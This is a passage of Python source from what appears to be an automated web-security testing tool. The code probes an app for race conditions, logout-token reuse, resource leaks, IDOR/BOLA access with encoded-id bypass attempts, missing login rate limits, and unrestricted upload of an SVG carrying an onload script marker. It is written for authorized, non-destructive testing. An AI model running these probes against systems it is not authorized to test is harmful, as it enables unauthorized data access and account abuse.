        m_mark = re.search(r"(?:CANARY|EXPECT|contains?)\s*[:=]?\s*['\"]?([^\s'\"]{4,})", oracle_txt, re.I)
        m_time = re.search(r"TIME\s*>?=\s*(\d+(?:\.\d+)?)", oracle_txt, re.I)
        if m_mark:
            tok = m_mark.group(1); verified = (tok in out) and ("[kali error" not in out)
            notes = f"canary/marker '{tok[:20]}' in stdout: {verified}"
        elif m_time:
            thr = float(m_time.group(1)); verified = (dur >= thr) and ("[kali error" not in out)
            notes = f"time-blind: ran {dur:.1f}s vs threshold >= {thr}s"
        else:
            verified = False
            notes = "no explicit oracle (SELECT / CANARY / TIME) -> inconclusive (X: weak-pass heuristic removed)"
    return {"status": 200 if verified else 500, "body": out[:2000],
            "probe": {"kind": "shell", "verdict": "pass" if verified else "fail",
                      "notes": notes, "code": code[:400]}, "probe_verified": verified}


# action -> leg. Web-shaped fact/authz/money moves route to `web`; the rest are distinct vectors.
# `probe`/`code` run a coder-written novel-code probe (the reach bridge/foothold path).
# ---------- STATEFUL multi-step probing (replay / idempotency / invariant) ----------
def _sf_get(obj, path):
    """Tiny extractor: $.field, $[0], $[0].field, $.a.b -- returns None on miss."""
    if not path or not isinstance(path, str) or not path.startswith("$"):
        return obj
    cur = obj
    for idx, key in re.findall(r"\[(\d+)\]|\.([A-Za-z_][A-Za-z0-9_]*)", path):
        try:
            if idx != "":
                cur = cur[int(idx)]
            elif isinstance(cur, dict):
                cur = cur.get(key)
            else:
                return None
        except Exception:
            return None
    return cur


def _sf_sub(val, vars):
    """Substitute {{var}} tokens from `vars`, recursively through dict/list/str."""
    if isinstance(val, str):
        return re.sub(r"\{\{([A-Za-z_][A-Za-z0-9_]*)\}\}",
                      lambda m: str(vars.get(m.group(1))) if vars.get(m.group(1)) is not None else m.group(0), val)
    if isinstance(val, dict):
        return {k: _sf_sub(v, vars) for k, v in val.items()}
    if isinstance(val, list):
        return [_sf_sub(v, vars) for v in val]
    return val


def spec_sql_used(move):
    """True if the move's business-state measure is DB-backed (measure['sql']) -> before/after are ground truth."""
    return bool(isinstance(move, dict) and isinstance(move.get("measure"), dict) and move["measure"].get("sql"))


def _sf_db_scalar(sql):
    """Run a scalar SELECT via the DB oracle (ground truth). Returns (float|None, raw). None = unavailable
    or non-numeric so the caller can tell 'no DB' apart from a real 0."""
    try:
        import test_suggestions as _TS
        raw = _TS.db(sql)
    except Exception as e:
        return None, f"[db error: {e}]"
    s = (raw or "").strip().splitlines()[0].strip() if (raw or "").strip() else ""
    if not s or s.startswith("[db error"):
        return None, raw
    try:
        return float(s), raw
    except Exception:
        return None, raw


def _sf_measure(sess, base, spec, vars):
    """Measure a business-state metric. If spec['sql'] is present, measure via the DB (GROUND TRUTH, G47);
    else GET a collection, filter items by field==captured-var, reduce count|sum(field) -> a number."""
    if not spec:
        return 0.0
    if spec.get("sql"):                                  # G47: DB ground-truth measurement (scoped by {{var}})
        val, _raw = _sf_db_scalar(_sf_sub(spec["sql"], vars))
        return float(val) if val is not None else 0.0
    path = _sf_sub(spec.get("path", "/"), vars)
    try:
        r = sess.get(base.rstrip("/") + path, timeout=25, verify=False)
        data = r.json()
    except Exception:
        return 0.0
    if isinstance(data, dict):
        for k in ("data", "items", "creditNotes", "invoices", "results", "rows"):
            if isinstance(data.get(k), list):
                data = data[k]; break
        else:
            data = [data]
    if not isinstance(data, list):
        return 0.0
    filt = spec.get("filter")
    if filt:
        want = vars.get(filt.get("eq_var"))
        data = [it for it in data if isinstance(it, dict) and str(it.get(filt.get("field"))) == str(want)]
    if spec.get("reduce") == "sum":
        f = spec.get("field", "total")
        return round(sum(float(it.get(f) or 0) for it in data if isinstance(it, dict)), 2)
    return float(len(data))


def stateful(move, ctx):
    """STATEFUL multi-step probe: run setup steps (with {{var}} capture), MEASURE a business-state metric,
    REPLAY the action step N times, measure again, apply a relational oracle (invariant|idempotency).
    Non-destructive (plant/write, never delete). Carries its own ground truth in result['stateful']."""
    import json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr(move.get("role", "owner")) if sfr else _rq.Session()
    try: sess.verify = False
    except Exception: pass
    vars, trace = {}, []
    def _clone_session(src):
        # requests.Session is NOT thread-safe -> give each racing thread its own, carrying the
        # same auth (cookies + headers) so the race is genuine, not serialized on one connection.
        c = _rq.Session()
        try:
            c.verify = False
            c.headers.update(getattr(src, "headers", {}) or {})
            c.cookies.update(getattr(src, "cookies", {}) or {})
        except Exception:
            pass
        return c
    def _run(step, sess_override=None):
        use = sess_override or sess
        m = (step.get("method") or "GET").upper()
        if m == "DELETE":
            trace.append({"step": "DELETE blocked (non-destructive)", "status": 0}); return None
        path = _sf_sub(step.get("path", "/"), vars)
        body = _sf_sub(step.get("body"), vars) if step.get("body") is not None else None
        try:
            r = use.request(m, base.rstrip("/") + path, json=body, timeout=25, verify=False)
        except Exception as e:
            trace.append({"step": m + " " + str(path), "status": -1, "err": str(e)[:80]}); return None
        trace.append({"step": m + " " + str(path), "status": r.status_code})
        try: j = r.json()
        except Exception: j = None
        # PICK a specific list item before capture (F3: avoid reusing an already-consumed record, e.g. an
        # already-invoiced job). pick={"where_empty":"invoices"} -> first item whose field is empty/missing.
        pick = step.get("pick")
        if pick and j is not None:
            items = j
            if isinstance(j, dict):
                for _k in ("data", "items", "jobs", "results", "rows"):
                    if isinstance(j.get(_k), list):
                        items = j[_k]; break
            if isinstance(items, list) and items:
                we = pick.get("where_empty")
                sel = next((it for it in items if isinstance(it, dict) and we is not None and not it.get(we)), None)
                j = sel if sel is not None else (items[0] if isinstance(items[0], dict) else j)
        for var, jp in (step.get("capture") or {}).items():
            vars[var] = _sf_get(j, jp)
        return r
    for step in (move.get("setup") or []):
        _run(step)
    # ---- SCAFFOLD-STATEFUL: resource leak/exhaustion persistence (docker cgroup RSS, control-compared) ----
    if move.get("oracle") == "resource_persistence":
        import subprocess as _sp, time as _t
        surface = move.get("surface") or (move.get("action_step") or {}).get("path") or ""
        container = move.get("container", "aegis-mirror-api-1")
        metric_path = move.get("metric_path", "/sys/fs/cgroup/memory.current")
        def _rss():
            vals = []
            for _ in range(3):
                try:
                    out = _sp.run(["docker", "exec", container, "cat", metric_path],
                                  capture_output=True, text=True, timeout=15).stdout.strip()
                    vals.append(int(out))
                except Exception:
                    pass
                _t.sleep(0.3)
            return max(vals) if vals else 0
        warm = int(move.get("warmup", 2)); cool = float(move.get("cooldown", 3)); reps = int(move.get("repeat", 8))
        heavy = move.get("action_step") or {}
        control = move.get("control_step") or heavy
        # MECH3 SCAFFOLD synth (resource_persistence x concurrency = LEAK-UNDER-LOAD): fire the heavy
        # requests CONCURRENTLY so a leak that a paced sequential run lets the GC keep up with shows up
        # under real load. Non-destructive (same heavy request); own session clone per thread.
        conc = int(move.get("concurrency", 1))
        def _run_batch(step, n):
            if conc > 1:
                import concurrent.futures as _cf
                def _one(_i):
                    try: return _run(step, _clone_session(sess))
                    except Exception: return None
                try:
                    with _cf.ThreadPoolExecutor(max_workers=min(conc, 16)) as ex:
                        list(ex.map(_one, range(n)))
                    return
                except Exception:
                    pass
            for _ in range(n): _run(step)
        for _ in range(warm): _run(heavy)                 # warmup (discard: pandas/JIT lazy-init spike)
        b_heavy = _rss()
        _run_batch(heavy, reps)
        _t.sleep(cool)                                    # GC/cooldown window before measuring
        a_heavy = _rss(); heavy_delta = a_heavy - b_heavy
        for _ in range(warm): _run(control)
        b_ctrl = _rss()
        _run_batch(control, reps)                         # same concurrency as heavy -> fair control
        _t.sleep(cool)
        a_ctrl = _rss(); control_delta = a_ctrl - b_ctrl
        from verified_findings import ResourcePersistenceOracle
        floor = float(move.get("floor", 40 * 1024 * 1024))   # 40MB absolute floor
        verdict, receipt = ResourcePersistenceOracle(heavy_delta, control_delta, floor=floor,
                                                     factor=float(move.get("factor", 2.0)), surface=surface).check()
        sf = {"oracle": "resource_persistence", "surface": surface, "container": container,
              "before": b_heavy, "after": a_heavy, "heavy_delta": heavy_delta, "control_delta": control_delta,
              "repeats": reps, "bound": None, "verdict": verdict, "receipt": receipt, "trace": trace[-6:]}
        return {"status": 200, "body": _json.dumps(sf)[:2000], "stateful": sf,
                "stateful_verified": verdict == "verified"}
    # ---- SCAFFOLD-STATEFUL: auth/session state (token not invalidated on logout) ----
    if move.get("oracle") == "auth_state":
        probe = move.get("probe_step") or {"method": "GET", "path": "/api/settings/details"}
        logout = move.get("logout_step") or {"method": "POST", "path": "/api/auth/logout"}
        r_pre = _run(probe)          # session_for_role is already authed -> expect 2xx
        # MECH3 SCAFFOLD synth (auth_state x timing = session-invalidation RACE): fire concurrent probes
        # on CLONED (same-auth) sessions right as logout runs, to catch a token still honoured inside the
        # revocation window -- a race a single sequential post-logout probe misses. Non-destructive.
        conc = int(move.get("concurrency", 1))
        if conc > 1:
            import concurrent.futures as _cf
            clones = [_clone_session(sess) for _ in range(conc)]
            _run(logout)
            def _reprobe(cs):
                try:
                    return _run(probe, cs)
                except Exception:
                    return None
            try:
                with _cf.ThreadPoolExecutor(max_workers=min(conc, 16)) as ex:
                    posts = list(ex.map(_reprobe, clones))
            except Exception:
                posts = [_run(probe)]
            # the WORST case (any clone still authorized) is the finding -> take the min status seen
            codes = [p.status_code for p in posts if p is not None] or [-1]
            r_post = None
            post_s = min(codes)      # a 2xx among post-logout probes = revocation-window reuse
        else:
            _run(logout)                 # explicit logout / invalidation
            r_post = _run(probe)         # same session -> expect 401/403 if invalidated
            post_s = r_post.status_code if r_post is not None else -1
        from verified_findings import AuthStateOracle
        surface = move.get("surface") or logout.get("path") or ""
        pre_s = r_pre.status_code if r_pre is not None else -1
        verdict, receipt = AuthStateOracle(pre_s, post_s, surface=surface,
                                           label=move.get("metric", "session-invalidation")).check()
        sf = {"oracle": "auth_state", "surface": surface, "before": pre_s, "after": post_s, "bound": None,
              "repeats": 1, "verdict": verdict, "receipt": receipt, "trace": trace}
        return {"status": 200, "body": _json.dumps(sf)[:2000], "stateful": sf,
                "stateful_verified": verdict == "verified"}
    before = _sf_measure(sess, base, move.get("measure") or {}, vars)
    bound = None
    bspec = move.get("bound") or {}
    if "const" in bspec:
        bound = float(bspec["const"])
    elif "var" in bspec:
        try: bound = float(vars.get(bspec["var"]))
        except Exception: bound = None
    reps = int(move.get("repeat", 2))
    action = move.get("action_step") or {}
    # MECH 3 synth: a CONCURRENCY>1 move (TOCTOU-on-invariant / double-effect race) fires the
    # action_step in parallel so a check-then-act window can breach a bound that holds under the
    # sequential replay already tested. Non-destructive (same action_step); falls back to
    # sequential on any threading error. Each thread uses its OWN session clone (requests
    # Sessions are not thread-safe) seeded from the same auth so the race is real, not serialized.
    conc = int(move.get("concurrency", 1))
    if conc > 1:
        import concurrent.futures as _cf
        n = max(reps, conc)
        def _one(_i):
            try:
                cs = _clone_session(sess)
                return _run(action, cs)
            except Exception:
                return None
        try:
            with _cf.ThreadPoolExecutor(max_workers=min(n, 16)) as ex:
                list(ex.map(_one, range(n)))
        except Exception:
            for _ in range(reps):
                _run(action)
    else:
        for _ in range(reps):
            _run(action)
    after = _sf_measure(sess, base, move.get("measure") or {}, vars)
    from verified_findings import InvariantOracle, IdempotencyOracle
    surface = move.get("surface") or action.get("path") or ""
    otype = move.get("oracle", "idempotency")

    def _relational(a):
        if otype == "invariant" and bound is not None:
            return InvariantOracle(before, a, bound, surface=surface,
                                   label=move.get("invariant", "measured<=bound")).check()
        return IdempotencyOracle(before, a, reps, unit=float(move.get("unit", 1.0)),
                                 surface=surface, label=move.get("metric", "state-count")).check()

    if otype != "invariant":
        otype = "idempotency"
    verdict, receipt = _relational(after)
    # ---- B1 REPRODUCIBILITY GATE (corpus+chaining roadmap): the board flagged non-determinism (flaky
    # reads / state drift / session invalidation) as the reason multi-step results can't be trusted.
    # When move['reproduce']>=2 (or AEGIS_STATEFUL_REPRODUCE), RE-MEASURE the business-state metric that
    # many times (READ-ONLY -- no extra plant, so it stays non-destructive + doesn't perturb state) and
    # require the relational verdict to be STABLE across every re-read. A verdict that doesn't reproduce
    # is downgraded to NOT-verified (recorded as a flaky lead), so only reproducible state survives. Opt-in
    # -> default (reproduce=1) preserves the existing, tested single-shot behaviour exactly."""
    reproduce = int(move.get("reproduce") or os.environ.get("AEGIS_STATEFUL_REPRODUCE", "1"))
    repro = None
    if reproduce >= 2 and verdict == "verified":
        agree, samples = 1, [after]
        for _ in range(reproduce - 1):
            a2 = _sf_measure(sess, base, move.get("measure") or {}, vars)
            samples.append(a2)
            v2, _ = _relational(a2)
            if v2 == "verified":
                agree += 1
        stable = agree == reproduce
        repro = {"required": reproduce, "agreed": agree, "stable": stable, "samples": samples}
        if not stable:
            verdict = "inconclusive"                 # did not reproduce -> not a verified finding
            receipt = dict(receipt, reproducibility=repro,
                           note="verdict did NOT reproduce across %d reads (flaky/non-deterministic)" % reproduce)
    # ---- G47 CAUSATION GATE (board 7/8 + meta-oracle bake-off): an HTTP-measured invariant "win" is the
    # proven ARTIFACT class -- a re-read can be mis-scoped or read pre-existing state, so held->violated on
    # HTTP numbers does NOT prove the exploit CAUSED the breach. Confirm causation against DB ground truth:
    #   * move['db_invariant'] = a SELECT returning rows ONLY when the invariant is VIOLATED for the scoped
    #     entity. Baseline (before the gate) must be EMPTY (clean); after must have ROWS. Both true -> the
    #     breach is real + exploit-caused (verified stands). Baseline non-empty -> pre-existing/loose ->
    #     rejected. After empty -> no real breach -> rejected.
    #   * else if move['measure']['sql'] was used, before/after are DB numbers -> InvariantOracle held->
    #     violated is already trustworthy (keep verdict).
    #   * else (HTTP-only invariant win) with the DB gate ON -> DOWNGRADE to 'inconclusive' (a lead, not a
    #     verified finding), because it cannot be confirmed exploit-caused. Gate: AEGIS_STATEFUL_DB_GATE=1
    #     (default). If the DB is unavailable, keep the HTTP verdict but annotate (don't break no-DB setups).
    causation = None
    if otype == "invariant" and verdict == "verified":
        db_inv = move.get("db_invariant")
        db_gate = os.environ.get("AEGIS_STATEFUL_DB_GATE", "1") != "0"
        if db_inv:
            after_rows = _sf_db_scalar("SELECT count(*) FROM (" + _sf_sub(db_inv, vars).rstrip(";") + ") _g;")
            arows = after_rows[0]
            if arows is None:                            # DB unreachable -> can't confirm, keep verdict + flag
                causation = {"method": "db_invariant", "status": "unavailable", "detail": str(after_rows[1])[:80]}
            elif arows > 0:
                causation = {"method": "db_invariant", "status": "confirmed", "violation_rows": arows}
            else:
                verdict = "rejected"
                causation = {"method": "db_invariant", "status": "no_breach",
                             "detail": "DB shows the invariant is NOT violated -- HTTP measure was an artifact"}
                receipt = dict(receipt, causation="no_breach (db_invariant empty after exploit)")
        elif spec_sql_used(move):
            causation = {"method": "sql_measure", "status": "confirmed",
                         "detail": "before/after measured against DB ground truth"}
        elif db_gate:
            verdict = "inconclusive"
            causation = {"method": "none", "status": "downgraded",
                         "detail": "HTTP-measured invariant cannot be confirmed exploit-caused; add "
                                   "move['db_invariant'] or measure['sql'] for a trustworthy verdict"}
            receipt = dict(receipt, causation="downgraded: no DB confirmation (AEGIS_STATEFUL_DB_GATE)")
    sf = {"oracle": otype, "surface": surface, "before": before, "after": after, "bound": bound,
          "repeats": reps, "verdict": verdict, "receipt": receipt, "trace": trace,
          "vars_captured": list(vars.keys())}
    if repro is not None:
        sf["reproducibility"] = repro
    if causation is not None:
        sf["causation"] = causation
    return {"status": 200, "body": _json.dumps(sf)[:2000], "stateful": sf,
            "stateful_verified": verdict == "verified"}


# ---------- MECH 2: DIFFERENTIAL / oracle-diversity discovery (see deltas a human never computes) ----------
def _fingerprint_response(r, elapsed_ms):
    import hashlib, json as _j
    body = r.text or ""
    field_order = ""
    try:
        d = _j.loads(body)
        if isinstance(d, dict):
            field_order = ",".join(list(d.keys()))
    except Exception:
        field_order = ""
    return {"status": r.status_code, "latency_ms": elapsed_ms, "body_len": len(body),
            "body_sha": hashlib.sha256(body.encode("utf-8", "replace")).hexdigest()[:16],
            "field_order": field_order}


def differential(move, ctx):
    """MECH 2: run the SAME request as N VARIANTS (roles/sessions) + k baseline repeats for a NOISE FLOOR,
    fingerprint each (status/latency/size/body-hash/field-order), and flag deltas a human never computes.
    Non-destructive (blocks DELETE; GET/idempotent by default). Emits LEADs (result['differential']), which
    make_oracle records as CANDIDATES to chase -- not verified findings (promote on a 2nd-oracle confirm)."""
    import time as _t, statistics as _st, json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    method = (move.get("method") or "GET").upper()
    if method == "DELETE":
        return {"status": 0, "blocked": "destructive (DELETE) -- blocked", "body": ""}
    path = move.get("surface") or move.get("path") or "/"
    url = base.rstrip("/") + (path if str(path).startswith("/") else "/" + str(path))
    variants = move.get("variants") or ["owner", "technician"]
    k = int(move.get("noise_k", 5))
    def _session(v):
        if sfr:
            return sfr(v)
        s = _rq.Session(); s.verify = False; return s
    def _hit(sess):
        t0 = _t.time()
        try:
            r = sess.request(method, url, json=move.get("body"), timeout=25, verify=False)
        except Exception:
            return None
        return _fingerprint_response(r, (_t.time() - t0) * 1000.0)
    # NOISE FLOOR: k repeats of the FIRST variant -> median + MAD of latency (statistical, not single-shot)
    bs = _session(variants[0]); lat = []
    for _ in range(max(2, k)):
        fp = _hit(bs)
        if fp: lat.append(fp["latency_ms"])
    med = _st.median(lat) if lat else 0.0
    mad = (_st.median([abs(x - med) for x in lat]) or 1.0) if lat else 1.0
    # one stabilized observation per variant (median latency over a few hits)
    obs = {}
    for v in variants:
        s = _session(v); reps = [x for x in (_hit(s) for _ in range(3)) if x]
        if not reps:
            continue
        o = dict(reps[-1]); o["latency_ms"] = _st.median([x["latency_ms"] for x in reps])
        obs[v] = o
    from verified_findings import DifferentialOracle
    verdict, receipt = DifferentialOracle(obs, {"latency_med": med, "latency_mad": mad}, surface=path).check()
    df = {"surface": path, "verdict": verdict, "leads": receipt.get("leads", []),
          "n_leads": receipt.get("n_leads", 0),
          "noise": {"latency_med": round(med, 1), "latency_mad": round(mad, 1)},
          "variants": receipt.get("variants", {})}
    return {"status": 200, "body": _json.dumps(df)[:2000], "differential": df,
            "differential_leads": df["n_leads"]}


def idor(move, ctx):
    """IDOR / BOLA sweep (object-level authz, commercial-parity). ENUMERATE object ids from a collection as
    the OWNER role, then try each object as ATTACKER role(s); an IdorOracle confirms object-level over-reach
    on distinguishing signals (attacker reads the SAME object bytes the owner sees + a nonexistent-id control
    is denied). READS ONLY by default (GET) -> non-destructive; a write/BOLA verb is opt-in and plant-for-
    proof (never erase). Carries its own ground truth in result['idor']."""
    import hashlib, json as _json, uuid as _uuid
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    def _sess(role):
        return sfr(role) if sfr else (lambda s: (setattr(s, "verify", False) or s))(_rq.Session())
    coll = move.get("collection") or move.get("surface") or "/"
    item_tpl = move.get("item") or (str(coll).rstrip("/") + "/{id}")
    # DIRECT-OBJECT surface like /rest/basket/1 (a specific object, not a listing): the template is the PARENT
    # path + {id}, and there is no collection to enumerate -> the cross-user arm below walks the id space.
    import re as _reid
    _mo = _reid.match(r"^(.*/)(\d+)/?$", str(coll))
    if _mo and not move.get("item"):
        item_tpl = _mo.group(1) + "{id}"
    id_field = move.get("id_field", "id")
    owner_role = move.get("owner_role") or move.get("role") or "owner"
    attackers = move.get("attacker_roles") or ["technician", "warehouse", "anon"]
    # #7 tenant axis: same-priv accounts in a DIFFERENT tenant/org read another tenant's object (distinct
    # from role-based over-reach). Pass cross_tenant_roles (session names for other-tenant users) to exercise.
    attackers = list(dict.fromkeys(list(attackers) + list(move.get("cross_tenant_roles") or [])))
    verb = (move.get("verb") or "GET").upper()
    if verb != "GET":                                    # non-destructive default: only reads sweep here
        return {"status": 0, "blocked": "idor write/BOLA verb requires explicit non-destructive plant path",
                "body": ""}
    sample = int(move.get("sample", 5))
    intended = {str(r).lower() for r in (move.get("intended_roles") or [])}

    def _sha(r):
        try:
            return hashlib.sha256((r.text or "").encode("utf-8", "replace")).hexdigest()[:16]
        except Exception:
            return ""

    def _id_variants(_id):
        """#7: alternate encodings of an id -- an authz-check-vs-DB-lookup PARSER DIFFERENTIAL may let an
        encoded form bypass a check that denied the raw id. Bounded; tried only when the raw id was denied."""
        import base64 as _b64
        from urllib.parse import quote as _q
        s = str(_id); out = []
        try: out.append(("base64", _b64.b64encode(s.encode()).decode().rstrip("=")))
        except Exception: pass
        try: out.append(("hex", s.encode().hex()))
        except Exception: pass
        try: out.append(("urlenc", _q(s, safe="")))
        except Exception: pass
        if s != s.upper(): out.append(("upper", s.upper()))
        if s.isdigit(): out.append(("neighbor", str(int(s) + 1)))
        return out[:int(os.environ.get("AEGIS_IDOR_ENC_CAP", "4"))]
    owner = _sess(owner_role)
    try:
        lr = owner.request("GET", base.rstrip("/") + coll, timeout=25, verify=False)
        data = lr.json()
    except Exception as e:
        return {"status": -1, "body": f"[idor] enumerate failed: {e}", "idor": {"verdict": "rejected",
                "surface": coll, "note": "could not enumerate collection"}, "idor_verified": False}
    items = data
    if isinstance(data, dict):
        for k in ("data", "items", "results", "rows", "invoices", "jobs", "customers"):
            if isinstance(data.get(k), list):
                items = data[k]; break
    ids = [it.get(id_field) for it in items if isinstance(it, dict) and it.get(id_field) is not None][:sample] \
        if isinstance(items, list) else []
    if not ids:
        # DIRECT-OBJECT cross-user arm: no enumerable collection (e.g. /rest/basket/1). Walk the id space as
        # ONE attacker identity; the tell is reading objects OWNED BY OTHER users (juice-shop basket shape).
        if "{id}" in item_tpl and (_mo or move.get("direct_object")):
            def _owner_of(r):
                try: j = r.json()
                except Exception: return None
                d = j.get("data") if isinstance(j, dict) and isinstance(j.get("data"), dict) else j
                if not isinstance(d, dict): return None
                for k in ("UserId", "userId", "user_id", "ownerId", "owner_id", "owner", "user"):
                    if d.get(k) is not None:
                        v = d[k]
                        return str(v.get("id")) if isinstance(v, dict) and v.get("id") is not None else str(v)
                return None
            lo = int(move.get("id_min", 1)); hi = int(move.get("id_max", move.get("id_range", 6)))
            atk_role = next((r for r in attackers if r.lower() not in intended),
                            (attackers[0] if attackers else "anon"))
            def _walk(_atk):
                rd = []
                for _id in range(lo, hi + 1):
                    try:
                        r = _atk.request("GET", base.rstrip("/") + item_tpl.format(id=_id), timeout=15, verify=False)
                    except Exception:
                        continue
                    rd.append({"id": _id, "status": r.status_code, "owner": _owner_of(r)})
                return rd
            atk = _sess(atk_role)
            reads = _walk(atk)
            # WIRING FIX (4c): the default attacker roles are target-shaped (technician/warehouse/anon); on an
            # app where they don't exist (e.g. juice-shop) the attacker session is unauthenticated -> 0 reads
            # and a FALSE reject. If the chosen attacker got NO 2xx read, retry as the move's own AUTHENTICATED
            # role -- the correct BOLA attacker on flat-tenant apps (every user can read peers' objects).
            if sum(1 for r in reads if 200 <= int(r.get("status", 0)) < 300) == 0 \
                    and move.get("role") and move.get("role") != atk_role:
                atk_role = move.get("role"); atk = _sess(atk_role); reads = _walk(atk)
            # nonexistent-id CONTROL: a numeric id space (range walk) needs a numeric out-of-range control (a
            # STRING control like "zzz-.." is mishandled by numeric-id apps and can 200 -> false 'public'
            # verdict). Deny = the object really doesn't exist. Also treat a control that returns NO owner as
            # denied (juice-shop 200s an empty body for a missing numeric basket).
            _ctrl_id = (hi + 10_000_000) if all(isinstance(r.get("id"), int) for r in reads) else ("zzz-" + _uuid.uuid4().hex[:8])
            try:
                cr = atk.request("GET", base.rstrip("/") + item_tpl.format(id=_ctrl_id), timeout=15, verify=False)
                control_denied = cr.status_code in (400, 401, 403, 404) or _owner_of(cr) is None
            except Exception:
                control_denied = True
            from verified_findings import IdorCrossUserOracle
            verdict, receipt = IdorCrossUserOracle(reads, control_denied=control_denied, surface=coll).check()
            idr = {"verdict": verdict, "surface": coll, "arm": "cross-user", "oracle_id": "idor-xuser@1",
                   "attacker": atk_role, "ids_tried": hi - lo + 1, **receipt}
            if verdict == "verified":                      # shape leads[] for the live-oracle finding summary
                idr["leads"] = [{"role": atk_role, "id": o} for o in (receipt.get("foreign_owners") or [])] \
                    or [{"role": atk_role, "id": "owners=%d" % receipt.get("distinct_owners", 0)}]
                idr["n_leads"] = len(idr["leads"])
            return {"status": 200, "body": _json.dumps(idr)[:2000], "idor": idr,
                    "idor_verified": verdict == "verified"}
        return {"status": 200, "body": "[idor] no object ids enumerated", "idor_verified": False,
                "idor": {"verdict": "rejected", "surface": coll, "note": "no ids to sweep"}}
    obs = []
    ctrl_id = "zzz-nonexistent-" + _uuid.uuid4().hex[:10]
    for role in attackers:
        if role.lower() in intended:
            continue
        atk = _sess(role)
        try:
            ctrl = atk.request("GET", base.rstrip("/") + item_tpl.format(id=ctrl_id), timeout=20, verify=False)
            ctrl_status = ctrl.status_code
        except Exception:
            ctrl_status = -1
        for _id in ids:
            url = base.rstrip("/") + item_tpl.format(id=_id)
            try:
                ov = owner.request("GET", url, timeout=20, verify=False)
                av = atk.request("GET", url, timeout=20, verify=False)
            except Exception:
                continue
            obs.append({"id": _id, "role": role, "owner_status": ov.status_code,
                        "attacker_status": av.status_code, "owner_sha": _sha(ov), "attacker_sha": _sha(av),
                        "control_status": ctrl_status, "verb": "GET", "encoding": "raw"})
            # #7: raw id DENIED -> try alt-encodings; a parser/authz differential may bypass the check.
            if av.status_code in (401, 403, 404) and move.get("alt_encoding", True):
                for enc, eid in _id_variants(_id):
                    try:
                        av2 = atk.request("GET", base.rstrip("/") + item_tpl.format(id=eid), timeout=15, verify=False)
                    except Exception:
                        continue
                    obs.append({"id": eid, "role": role, "owner_status": ov.status_code,
                                "attacker_status": av2.status_code, "owner_sha": _sha(ov),
                                "attacker_sha": _sha(av2), "control_status": ctrl_status,
                                "verb": "GET", "encoding": enc})
    from verified_findings import IdorOracle
    verdict, receipt = IdorOracle(obs, surface=coll).check()
    idr = {"verdict": verdict, "surface": coll, "owner_role": owner_role, "attackers": attackers,
           "ids_swept": len(ids), **receipt}
    return {"status": 200, "body": _json.dumps(idr)[:2000], "idor": idr, "idor_verified": verdict == "verified"}


def rate(move, ctx):
    """RATE-LIMIT / anti-automation probe on a SENSITIVE endpoint (login/reset/OTP). Fires a BOUNDED burst
    of identical requests using a NONEXISTENT identity (so no real account is locked -- non-destructive) and
    a RateLimitOracle confirms the weakness iff no throttle (429/423/503) appears. N is hard-capped so the
    burst can never be a DoS. Carries ground truth in result['rate']."""
    import json as _json
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    path = move.get("surface") or move.get("path") or _discover_login(base)
    method = (move.get("method") or "POST").upper()
    if method in ("DELETE", "PUT"):                      # never a destructive verb for a rate probe
        return {"status": 0, "blocked": "rate probe restricted to GET/POST", "body": ""}
    n = min(int(move.get("n", 15)), int(os.environ.get("AEGIS_RATE_MAX", "25")))   # hard DoS cap
    # a NONEXISTENT identity so repeated failures can't lock a real account (non-destructive)
    body = move.get("body") or {"name": "zzz-nonexistent-" + __import__("uuid").uuid4().hex[:8],
                                "pin": "000000", "username": "zzz-nobody", "password": "x"}
    s = _rq.Session(); s.verify = False
    statuses = []
    url = base.rstrip("/") + (path if str(path).startswith("/") else "/" + str(path))
    for _ in range(n):
        try:
            r = s.request(method, url, json=(body if method == "POST" else None), timeout=15, verify=False)
            statuses.append(r.status_code)
        except Exception:
            statuses.append(-1)
    from verified_findings import RateLimitOracle
    verdict, receipt = RateLimitOracle(statuses, endpoint=path,
                                       min_attempts=int(move.get("min_attempts", 10))).check()
    rt = {"verdict": verdict, "surface": path, **receipt}
    return {"status": 200, "body": _json.dumps(rt)[:2000], "rate": rt, "rate_verified": verdict == "verified"}


def file_upload(move, ctx):
    """UNRESTRICTED FILE UPLOAD probe: multipart-upload a benign ACTIVE-CONTENT marker (an .svg carrying a
    script marker) to an upload endpoint, then retrieve it and check whether it is served with a RENDERABLE
    content-type (a FileUploadOracle confirms). Plants ONE small marker file -> non-destructive (never
    erases). Spec via move['upload']={path,field,filename,content,content_type}; else uses move.surface with
    field 'file'. Ground truth in result['upload']."""
    import json as _json, uuid as _uuid, re as _re
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sfr = (ctx or {}).get("session_for_role")
    sess = sfr(move.get("role", "owner")) if sfr else _rq.Session()
    try: sess.verify = False
    except Exception: pass
    spec = move.get("upload") or {}
    path = spec.get("path") or move.get("surface") or move.get("path")
    if not path:
        return {"status": 0, "body": "[file_upload] no upload path", "upload_verified": False,
                "upload": {"verdict": "rejected", "note": "no upload endpoint"}}
    field = spec.get("field", "file")
    tok = "UP" + _uuid.uuid4().hex[:8]
    fn = spec.get("filename") or f"aegis-{tok}.svg"
    content = spec.get("content") or (
        f'<svg xmlns="http://www.w3.org/2000/svg" onload="window.__aegis_xss=\'{tok}\'"><text>{tok}</text></svg>')
    ctype = spec.get("content_type", "image/svg+xml")
    url = base.rstrip("/") + (path if str(path).startswith("/") else "/" + str(path))
    try:
        r = sess.post(url, files={field: (fn, content, ctype)}, timeout=25, verify=False)
    except Exception as e:
        return {"status": -1, "body": f"[file_upload] {e}", "upload_verified": False,
                "upload": {"verdict": "rejected", "note": "upload request error"}}
    # find the stored file URL/path in the response
    stored = None
    try:
        j = r.json()
        blob = _json.dumps(j)
